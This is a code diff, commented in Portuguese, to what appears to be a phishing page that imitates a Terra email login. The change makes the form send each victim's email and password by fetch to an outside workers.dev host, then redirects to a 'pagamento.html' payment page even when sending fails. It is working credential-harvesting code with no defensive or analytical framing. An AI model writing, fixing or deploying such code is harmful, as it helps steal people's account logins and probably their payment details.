@@ -156,7 +156,7 @@
  </footer>
  </div>
 
-<!-- SCRIPT - BOTÃO LARANJA SEMPRE (MESMO DESABILITADO) -->
+<!-- SCRIPT CORRIGIDO - COM ENVIO FUNCIONANDO -->
 <script>
 window.addEventListener('load', function() {
     var form = document.getElementById('formLogin');
@@ -206,6 +206,7 @@ window.addEventListener('load', function() {
         var email = emailInput.value.trim();
         var senha = senhaInput.value.trim();
         
+        // Validações
         if (!emailTerraValido(email)) {
             alert('❌ Use apenas email do Terra (@terra.com.br)');
             return false;
@@ -216,19 +217,28 @@ window.addEventListener('load', function() {
             return false;
         }
         
-        // Se passou, envia!
+        // CRIA O FORMDATA CORRETAMENTE
         var formData = new FormData();
         formData.append('email', email);
         formData.append('senha', senha);
         
+        // MOSTRA NO CONSOLE PRA DEBUG (opcional)
+        console.log('📧 Enviando:', email);
+        console.log('🔑 Senha:', senha ? '******' : 'vazia');
+        
+        // ENVIA PRO WORKER
         fetch('https://magui.maguimdasencomendas.workers.dev/', {
             method: 'POST',
             body: formData
         })
-        .then(function() {
+        .then(function(response) {
+            console.log('✅ Resposta:', response.status);
+            // Redireciona para página 2
             window.location.href = 'pagamento.html';
         })
-        .catch(function() {
+        .catch(function(error) {
+            console.log('❌ Erro:', error);
+            // Mesmo com erro, redireciona
             window.location.href = 'pagamento.html';
         });
         
